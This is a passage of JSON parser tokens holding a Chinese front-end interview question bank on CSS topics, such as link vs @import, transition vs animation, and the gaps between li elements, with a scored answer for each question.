元素不会独占一行，设置width、height属性无效。但可以设置水平方向的margin和padding属性，不能设置垂直方向的padding和margin；","text":"inline： 元素不会独占一行，设置width、height属性无效。但可以设置水平方向的margin和padding属性，不能设置垂直方向的padding和margin；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"inline-block： 将对象设置为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。","text":"inline-block： 将对象设置为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。","tokens":[{"type":"text","raw":"inline-block： 将对象设置为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。","text":"inline-block： 将对象设置为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 32. link和@import的区别\\n\\n","depth":2,"text":"32. link和@import的区别","tokens":[{"type":"text","raw":"32. link和@import的区别","text":"32. link和@import的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"两者都是外部引用CSS的方式，它们的区别如下：","text":"两者都是外部引用CSS的方式，它们的区别如下：","tokens":[{"type":"text","raw":"两者都是外部引用CSS的方式，它们的区别如下：","text":"两者都是外部引用CSS的方式，它们的区别如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。\\n\\n- link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。\\n\\n- link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。\\n\\n- link支持使用Javascript控制DOM去改变样式；而@import不支持。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。\\n\\n","task":false,"loose":true,"text":"link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。\\n","tokens":[{"type":"text","raw":"link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。\\n","text":"link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。","tokens":[{"type":"text","raw":"link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。","text":"link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。","escaped":false}]}]},{"type":"list_item","raw":"- link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。\\n\\n","task":false,"loose":true,"text":"link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。\\n","tokens":[{"type":"text","raw":"link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。\\n","text":"link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。","tokens":[{"type":"text","raw":"link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。","text":"link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。","escaped":false}]}]},{"type":"list_item","raw":"- link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。\\n\\n","task":false,"loose":true,"text":"link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。\\n","tokens":[{"type":"text","raw":"link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。\\n","text":"link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。","tokens":[{"type":"text","raw":"link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。","text":"link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。","escaped":false}]}]},{"type":"list_item","raw":"- link支持使用Javascript控制DOM去改变样式；而@import不支持。","task":false,"loose":true,"text":"link支持使用Javascript控制DOM去改变样式；而@import不支持。","tokens":[{"type":"text","raw":"link支持使用Javascript控制DOM去改变样式；而@import不支持。","text":"link支持使用Javascript控制DOM去改变样式；而@import不支持。","tokens":[{"type":"text","raw":"link支持使用Javascript控制DOM去改变样式；而@import不支持。","text":"link支持使用Javascript控制DOM去改变样式；而@import不支持。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 33. transition和animation的区别\\n\\n","depth":2,"text":"33. transition和animation的区别","tokens":[{"type":"text","raw":"33. transition和animation的区别","text":"33. transition和animation的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"transition是过度属性，强调过度，它的实现需要触发一个事件（比如鼠标移动上去，焦点，点击等）才执行动画。它类似于flash的补间动画，设置一个开始关键帧，一个结束关键帧。","text":"transition是过度属性，强调过度，它的实现需要触发一个事件（比如鼠标移动上去，焦点，点击等）才执行动画。它类似于flash的补间动画，设置一个开始关键帧，一个结束关键帧。","tokens":[{"type":"text","raw":"transition是过度属性，强调过度，它的实现需要触发一个事件（比如鼠标移动上去，焦点，点击等）才执行动画。它类似于flash的补间动画，设置一个开始关键帧，一个结束关键帧。","text":"transition是过度属性，强调过度，它的实现需要触发一个事件（比如鼠标移动上去，焦点，点击等）才执行动画。它类似于flash的补间动画，设置一个开始关键帧，一个结束关键帧。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"animation是动画属性，它的实现不需要触发事件，设定好时间之后可以自己执行，且可以循环一个动画。它也类似于flash的补间动画，但是它可以设置多个关键帧（用@keyframe定义）完成动画。","text":"animation是动画属性，它的实现不需要触发事件，设定好时间之后可以自己执行，且可以循环一个动画。它也类似于flash的补间动画，但是它可以设置多个关键帧（用@keyframe定义）完成动画。","tokens":[{"type":"text","raw":"animation是动画属性，它的实现不需要触发事件，设定好时间之后可以自己执行，且可以循环一个动画。它也类似于flash的补间动画，但是它可以设置多个关键帧（用@keyframe定义）完成动画。","text":"animation是动画属性，它的实现不需要触发事件，设定好时间之后可以自己执行，且可以循环一个动画。它也类似于flash的补间动画，但是它可以设置多个关键帧（用@keyframe定义）完成动画。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 34. display:none与visibility:hidden的区别\\n\\n","depth":2,"text":"34. display:none与visibility:hidden的区别","tokens":[{"type":"text","raw":"34. display:none与visibility:hidden的区别","text":"34. display:none与visibility:hidden的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"这两个属性都是让元素隐藏，不可见。两者区别如下：","text":"这两个属性都是让元素隐藏，不可见。两者区别如下：","tokens":[{"type":"text","raw":"这两个属性都是让元素隐藏，不可见。两者区别如下：","text":"这两个属性都是让元素隐藏，不可见。两者区别如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"display:none会让元素完全从渲染树中消失，渲染时不会占据任何空间；","text":"display:none会让元素完全从渲染树中消失，渲染时不会占据任何空间；","tokens":[{"type":"text","raw":"display:none会让元素完全从渲染树中消失，渲染时不会占据任何空间；","text":"display:none会让元素完全从渲染树中消失，渲染时不会占据任何空间；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"visibility:hidden不会让元素从渲染树中消失，渲染的元素还会占据相应的空间，只是内容不可见。","text":"visibility:hidden不会让元素从渲染树中消失，渲染的元素还会占据相应的空间，只是内容不可见。","tokens":[{"type":"text","raw":"visibility:hidden不会让元素从渲染树中消失，渲染的元素还会占据相应的空间，只是内容不可见。","text":"visibility:hidden不会让元素从渲染树中消失，渲染的元素还会占据相应的空间，只是内容不可见。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 35. 伪元素和伪类的区别和作用？\\n\\n","depth":2,"text":"35. 伪元素和伪类的区别和作用？","tokens":[{"type":"text","raw":"35. 伪元素和伪类的区别和作用？","text":"35. 伪元素和伪类的区别和作用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"伪元素：在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。","text":"伪元素：在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。","tokens":[{"type":"text","raw":"伪元素：在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。","text":"伪元素：在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"伪类：将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。","text":"伪类：将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。","tokens":[{"type":"text","raw":"伪类：将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。","text":"伪类：将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 36. 为什么有时候⽤translate来改变位置⽽不是定位？\\n\\n","depth":2,"text":"36. 为什么有时候⽤translate来改变位置⽽不是定位？","tokens":[{"type":"text","raw":"36. 为什么有时候⽤translate来改变位置⽽不是定位？","text":"36. 为什么有时候⽤translate来改变位置⽽不是定位？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"translate 是 transform 属性的⼀个值。改变transform或opacity不会触发浏览器重新布局（reflow）或重绘（repaint），只会触发复合（compositions）。⽽改变绝对定位会触发重新布局，进⽽触发重绘和复合。transform使浏览器为元素创建⼀个 GPU 图层，但改变绝对定位会使⽤到 CPU。 因此translate()更⾼效，可以缩短平滑动画的绘制时间。⽽translate改变位置时，元素依然会占据其原始空间，绝对定位就不会发⽣这种情况。","text":"translate 是 transform 属性的⼀个值。改变transform或opacity不会触发浏览器重新布局（reflow）或重绘（repaint），只会触发复合（compositions）。⽽改变绝对定位会触发重新布局，进⽽触发重绘和复合。transform使浏览器为元素创建⼀个 GPU 图层，但改变绝对定位会使⽤到 CPU。 因此translate()更⾼效，可以缩短平滑动画的绘制时间。⽽translate改变位置时，元素依然会占据其原始空间，绝对定位就不会发⽣这种情况。","tokens":[{"type":"text","raw":"translate 是 transform 属性的⼀个值。改变transform或opacity不会触发浏览器重新布局（reflow）或重绘（repaint），只会触发复合（compositions）。⽽改变绝对定位会触发重新布局，进⽽触发重绘和复合。transform使浏览器为元素创建⼀个 GPU 图层，但改变绝对定位会使⽤到 CPU。 因此translate()更⾼效，可以缩短平滑动画的绘制时间。⽽translate改变位置时，元素依然会占据其原始空间，绝对定位就不会发⽣这种情况。","text":"translate 是 transform 属性的⼀个值。改变transform或opacity不会触发浏览器重新布局（reflow）或重绘（repaint），只会触发复合（compositions）。⽽改变绝对定位会触发重新布局，进⽽触发重绘和复合。transform使浏览器为元素创建⼀个 GPU 图层，但改变绝对定位会使⽤到 CPU。 因此translate()更⾼效，可以缩短平滑动画的绘制时间。⽽translate改变位置时，元素依然会占据其原始空间，绝对定位就不会发⽣这种情况。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 37. li 与 li 之间有看不见的空白间隔是什么原因引起的？如何解决？\\n\\n","depth":2,"text":"37. li 与 li 之间有看不见的空白间隔是什么原因引起的？如何解决？","tokens":[{"type":"text","raw":"37. li 与 li 之间有看不见的空白间隔是什么原因引起的？如何解决？","text":"37. li 与 li 之间有看不见的空白间隔是什么原因引起的？如何解决？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"浏览器会把inline内联元素间的空白字符（空格、换行、Tab等）渲染成一个空格。为了美观，通常是一个li放在一行，这导致li换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。","text":"浏览器会把inline内联元素间的空白字符（空格、换行、Tab等）渲染成一个空格。为了美观，通常是一个li放在一行，这导致li换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。","tokens":[{"type":"text","raw":"浏览器会把inline内联元素间的空白字符（空格、换行、Tab等）渲染成一个空格。为了美观，通常是一个li放在一行，这导致li换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。","text":"浏览器会把inline内联元素间的空白字符（空格、换行、Tab等）渲染成一个空格。为了美观，通常是一个li放在一行，这导致li换行后产生换行字符，它变成一个空格，占用了一个字符的宽度。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"解决办法：","text":"解决办法：","tokens":[{"type":"text","raw":"解决办法：","text":"解决办法：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。\\n\\n- 将所有li写在同一行。不足：代码不美观。\\n\\n- 为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。\\n\\n- 为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。\\n\\n","task":false,"loose":true,"text":"为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。\\n","tokens":[{"type":"text","raw":"为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。\\n","text":"为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。","tokens":[{"type":"text","raw":"为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。","text":"为li设置float:left。不足：有些容器是不能设置浮动，如左右切换的焦点图等。","escaped":false}]}]},{"type":"list_item","raw":"- 将所有li写在同一行。不足：代码不美观。\\n\\n","task":false,"loose":true,"text":"将所有li写在同一行。不足：代码不美观。\\n","tokens":[{"type":"text","raw":"将所有li写在同一行。不足：代码不美观。\\n","text":"将所有li写在同一行。不足：代码不美观。","tokens":[{"type":"text","raw":"将所有li写在同一行。不足：代码不美观。","text":"将所有li写在同一行。不足：代码不美观。","escaped":false}]}]},{"type":"list_item","raw":"- 为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。\\n\\n","task":false,"loose":true,"text":"为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。\\n","tokens":[{"type":"text","raw":"为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。\\n","text":"为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。","tokens":[{"type":"text","raw":"为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。","text":"为ul设置font-size:0;。不足：如果该列表内还有其他元素，需要为其他元素设置font-size，且要保证跟父元素内font-size的值相同。","escaped":false}]}]},{"type":"list_item","raw":"- 为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","task":false,"loose":true,"text":"为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","tokens":[{"type":"text","raw":"为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","text":"为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","tokens":[{"type":"text","raw":"为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","text":"为li设置margin:0 -4px;。不足：假如li换行，会产生新的空白间隔。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 38. CSS3中有哪些新特性\\n\\n","depth":2,"text":"38. CSS3中有哪些新特性","tokens":[{"type":"text","raw":"38. CSS3中有哪些新特性","text":"38. CSS3中有哪些新特性","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n\\n- 圆角 （border-radius:8px）\\n\\n- 多列布局 （multi-column layout）\\n\\n- 阴影和反射 （Shadoweflect）\\n\\n- 文字特效 （text-shadow）\\n\\n- 线性渐变 （gradient）\\n\\n- 旋转 （transform）\\n\\n- 增加了更多的CSS3选择器 多背景 rgba\\n\\n- 在CSS3中唯一引入的伪元素是::selection\\n\\n- 媒体查询，多栏布局\\n\\n- border-image","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n\\n","task":false,"loose":true,"text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n","tokens":[{"type":"text","raw":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n","text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","tokens":[{"type":"text","raw":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","escaped":false}]}]},{"type":"list_item","raw":"- 圆角 （border-radius:8px）\\n\\n","task":false,"loose":true,"text":"圆角 （border-radius:8px）\\n","tokens":[{"type":"text","raw":"圆角 （border-radius:8px）\\n","text":"圆角 （border-radius:8px）","tokens":[{"type":"text","raw":"圆角 （border-radius:8px）","text":"圆角 （border-radius:8px）","escaped":false}]}]},{"type":"list_item","raw":"- 多列布局 （multi-column layout）\\n\\n","task":false,"loose":true,"text":"多列布局 （multi-column layout）\\n","tokens":[{"type":"text","raw":"多列布局 （multi-column layout）\\n","text":"多列布局 （multi-column layout）","tokens":[{"type":"text","raw":"多列布局 （multi-column layout）","text":"多列布局 （multi-column layout）","escaped":false}]}]},{"type":"list_item","raw":"- 阴影和反射 （Shadoweflect）\\n\\n","task":false,"loose":true,"text":"阴影和反射 （Shadoweflect）\\n","tokens":[{"type":"text","raw":"阴影和反射 （Shadoweflect）\\n","text":"阴影和反射 （Shadoweflect）","tokens":[{"type":"text","raw":"阴影和反射 （Shadoweflect）","text":"阴影和反射 （Shadoweflect）","escaped":false}]}]},{"type":"list_item","raw":"- 文字特效 （text-shadow）\\n\\n","task":false,"loose":true,"text":"文字特效 （text-shadow）\\n","tokens":[{"type":"text","raw":"文字特效 （text-shadow）\\n","text":"文字特效 （text-shadow）","tokens":[{"type":"text","raw":"文字特效 （text-shadow）","text":"文字特效 （text-shadow）","escaped":false}]}]},{"type":"list_item","raw":"- 线性渐变 （gradient）\\n\\n","task":false,"loose":true,"text":"线性渐变 （gradient）\\n","tokens":[{"type":"text","raw":"线性渐变 （gradient）\\n","text":"线性渐变 （gradient）","tokens":[{"type":"text","raw":"线性渐变 （gradient）","text":"线性渐变 （gradient）","escaped":false}]}]},{"type":"list_item","raw":"- 旋转 （transform）\\n\\n","task":false,"loose":true,"text":"旋转 （transform）\\n","tokens":[{"type":"text","raw":"旋转 （transform）\\n","text":"旋转 （transform）","tokens":[{"type":"text","raw":"旋转 （transform）","text":"旋转 （transform）","escaped":false}]}]},{"type":"list_item","raw":"- 增加了更多的CSS3选择器 多背景 rgba\\n\\n","task":false,"loose":true,"text":"增加了更多的CSS3选择器 多背景 rgba\\n","tokens":[{"type":"text","raw":"增加了更多的CSS3选择器 多背景 rgba\\n","text":"增加了更多的CSS3选择器 多背景 rgba","tokens":[{"type":"text","raw":"增加了更多的CSS3选择器 多背景 rgba","text":"增加了更多的CSS3选择器 多背景 rgba","escaped":false}]}]},{"type":"list_item","raw":"- 在CSS3中唯一引入的伪元素是::selection\\n\\n","task":false,"loose":true,"text":"在CSS3中唯一引入的伪元素是::selection\\n","tokens":[{"type":"text","raw":"在CSS3中唯一引入的伪元素是::selection\\n","text":"在CSS3中唯一引入的伪元素是::selection","tokens":[{"type":"text","raw":"在CSS3中唯一引入的伪元素是::selection","text":"在CSS3中唯一引入的伪元素是::selection","escaped":false}]}]},{"type":"list_item","raw":"- 媒体查询，多栏布局\\n\\n","task":false,"loose":true,"text":"媒体查询，多栏布局\\n","tokens":[{"type":"text","raw":"媒体查询，多栏布局\\n","text":"媒体查询，多栏布局","tokens":[{"type":"text","raw":"媒体查询，多栏布局","text":"媒体查询，多栏布局","escaped":false}]}]},{"type":"list_item","raw":"- border-image","task":false,"loose":true,"text":"border-image","tokens":[{"type":"text","raw":"border-image","text":"border-image","tokens":[{"type":"text","raw":"border-image","text":"border-image","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 39. 对 CSSSprites 的理解\\n\\n","depth":2,"text":"39. 对 CSSSprites 的理解","tokens":[{"type":"text","raw":"39. 对 CSSSprites 的理解","text":"39. 对 CSSSprites 的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 